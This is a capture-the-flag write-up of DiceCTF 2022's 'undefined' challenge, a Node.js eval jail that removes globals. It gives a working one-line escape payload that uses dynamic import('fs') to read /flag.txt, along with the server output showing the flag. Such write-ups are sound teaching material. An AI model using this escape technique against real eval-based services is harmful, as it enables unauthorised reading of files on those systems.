# Writeup of "undefined" challenge from DiceCTF 2022

Writeup author: wiegnand (Lucas Baizer)

The challenge (written by aplet123) had this description:
```
I was writing some Javascript when everything became undefined...

Can you create something out of nothing and read the flag at /flag.txt? Tested for Node version 17.

nc mc.ax 31131
```
Attached to the challenge was a single file, [index.js](./index.js).

# Understanding index.js

The first thing I did was simply just read the contents of the `index.js` file and try and understand what it does. It removes almost all global variables, and undefines the function constructor field. The only global variables left are the `console` object and the `eval` function. After undefining everything, the script runs `eval` on arbitrary code sent through `nc`.

# Reversing

The ultimate goal is to read the file at `/flag.txt`, which my intial thought would be that we will require our payload to require the `fs` module somehow.

My first goal in finding a potential payload was considering if Node 17 has some instrinic global function of field that existed outside of the `global` object. My first guess was to use the dynamic import function, `import`.

# Exploitation

As a first guess, using the `import` function, I sent the payload to the `nc` server:
```javascript
import('fs').then(fs => console.log(fs.readFileSync('/flag.txt', 'utf8')))
```
Which resulted in the server giving the output:
```
Promise { <pending> }
dice{who_needs_builtins_when_you_have_arguments}
```
It seems that the `import` function was somehow not undefined, and allowed us to get the flag.